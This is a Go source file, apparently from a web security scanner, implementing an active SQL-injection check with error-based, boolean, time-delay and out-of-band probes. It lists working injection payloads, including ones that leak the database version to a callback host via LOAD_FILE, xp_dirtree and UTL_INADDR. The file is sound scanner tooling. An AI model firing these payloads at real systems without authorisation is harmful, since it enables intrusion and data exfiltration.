// Package sqli is the active SQL-injection rule. It exposes a catalog of named
// checks (error-based, boolean-based, time-based, out-of-band); each appends
// read-only payloads to a parameter and confirms via the shared DB-error matcher, a
// structural true/false differential, a timing delay, or a callback.
package sqli

import (
	"context"
	"time"

	"github.com/BishopFox/joro/internal/activescan"
	"github.com/BishopFox/joro/internal/activescan/injkit"
	"github.com/BishopFox/joro/internal/detect"
)

const (
	ruleID      = "sqli"
	findingRule = "activescan.sqli"
	sleepMs     = 5000
	oastWindow  = 12 * time.Second
)

var errorSuffixes = []string{`'`, `"`, `')`, `'"`}

var booleanPairs = [][2]string{
	{`' AND '1'='1`, `' AND '1'='2`},
	{` AND 1=1`, ` AND 1=2`},
	{`" AND "1"="1`, `" AND "1"="2`},
}

var timeSuffixes = []string{
	`' AND SLEEP(5)-- -`,
	` AND SLEEP(5)`,
	`'||pg_sleep(5)--`,
	`';WAITFOR DELAY '0:0:5'--`,
}

func oastSuffixes(host string) []string {
	return []string{
		`' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.` + host + `\\x')))-- -`,
		`';EXEC master..xp_dirtree '\\` + host + `\x';--`,
		`'||(SELECT UTL_INADDR.get_host_address('` + host + `') FROM dual)--`,
	}
}

var checks = []injkit.Check{
	{
		ID: "error-based", Name: "Error-based", Severity: detect.SeverityHigh,
		Description: "Appends quote/paren breakers and matches the response against database error signatures.",
		Payloads:    errorSuffixes,
		Probe:       errorBased,
	},
	{
		ID: "boolean-based", Name: "Boolean-based", Severity: detect.SeverityHigh,
		Description: "Sends a TRUE and a FALSE condition and reports when TRUE matches the baseline while FALSE differs.",
		Payloads:    []string{`' AND '1'='1`, `' AND '1'='2`, ` AND 1=1`, ` AND 1=2`},
		Probe:       booleanBased,
	},
	{
		ID: "time-based", Name: "Time-based", Severity: detect.SeverityHigh,
		Description: "Injects a database sleep and confirms a delayed response twice to reject jitter.",
		Payloads:    timeSuffixes,
		Probe:       timeBased,
	},
	{
		ID: "oast", Name: "Out-of-band", Severity: detect.SeverityHigh,
		Description:  "Injects DNS/SMB exfiltration payloads and polls the callback listener for an interaction.",
		Payloads:     []string{`LOAD_FILE(CONCAT('\\\\',…,'.<callback>\\x'))`, `xp_dirtree '\\<callback>\x'`, `UTL_INADDR.get_host_address('<callback>')`},
		RequiresOAST: true,
		Probe:        oastBased,
	},
}

// Rule implements activescan.Rule and activescan.Cataloger (via the embedded set).
type Rule struct{ *activescan.DisabledSet }

func New() *Rule { return &Rule{activescan.NewDisabledSet()} }

func (*Rule) ID() string                { return ruleID }
func (*Rule) Name() string              { return "SQL injection" }
func (*Rule) Category() detect.Category { return detect.CategorySQLi }
func (*Rule) Description() string {
	return "Appends error-based, boolean-differential, time-based, and (when a callback " +
		"listener is configured) out-of-band SQL payloads to each parameter, confirming via " +
		"database error signatures, a true/false response differential, a timing delay, or a callback."
}

func (r *Rule) CatalogItems() []activescan.CatalogItem {
	return injkit.Catalog(checks, r.DisabledSet, false)
}

func (r *Rule) Run(ctx context.Context, t activescan.Target, cfg activescan.Config, deps activescan.RuleDeps, rep activescan.Reporter) error {
	injkit.RunChecks(ctx, t, cfg, deps, rep, checks, r.DisabledSet, findingRule, detect.CategorySQLi, "SQL injection")
	return nil
}

func errorBased(pc injkit.ProbeCtx) {
	for _, s := range errorSuffixes {
		res := pc.Inject(s, true)
		if res == nil {
			continue
		}
		if engine, ev, ok := detect.MatchSQLError(res.Resp.Body); ok {
			pc.File(detect.SeverityHigh, "error-based SQLi in "+pc.Point.Name+" ("+engine+")", engine+" error: "+ev, res.URL)
			return
		}
	}
}

func booleanBased(pc injkit.ProbeCtx) {
	for _, pair := range booleanPairs {
		tr, fa := pc.Inject(pair[0], true), pc.Inject(pair[1], true)
		if tr == nil || fa == nil {
			continue
		}
		if injkit.SameStructure(tr.Fingerprint, pc.Base.Fingerprint) &&
			!injkit.SameStructure(fa.Fingerprint, pc.Base.Fingerprint) {
			pc.File(detect.SeverityHigh, "boolean-based SQLi in "+pc.Point.Name,
				"TRUE ("+pair[0]+") matched the baseline; FALSE ("+pair[1]+") differed", tr.URL)
			return
		}
	}
}

func timeBased(pc injkit.ProbeCtx) {
	for _, s := range timeSuffixes {
		res := pc.Inject(s, true)
		if res == nil || !injkit.LooksDelayed(res.DurationMs, pc.Base.FloorMs, sleepMs) {
			continue
		}
		if res2 := pc.Inject(s, true); res2 != nil && injkit.LooksDelayed(res2.DurationMs, pc.Base.FloorMs, sleepMs) {
			pc.File(detect.SeverityHigh, "time-based blind SQLi in "+pc.Point.Name,
				"injecting "+s+" delayed the response twice (~5s over baseline)", res.URL)
			return
		}
	}
}

func oastBased(pc injkit.ProbeCtx) {
	if pc.OAST == nil {
		return
	}
	tokenID, host, err := pc.OAST.Token("sqli")
	if err != nil {
		return
	}
	for _, s := range oastSuffixes(host) {
		pc.Inject(s, true)
	}
	if pc.OAST.Fired(pc.Ctx, tokenID, oastWindow) {
		pc.File(detect.SeverityHigh, "out-of-band SQLi in "+pc.Point.Name,
			"an injected payload triggered a callback to "+host, pc.Base.URL)
	}
}
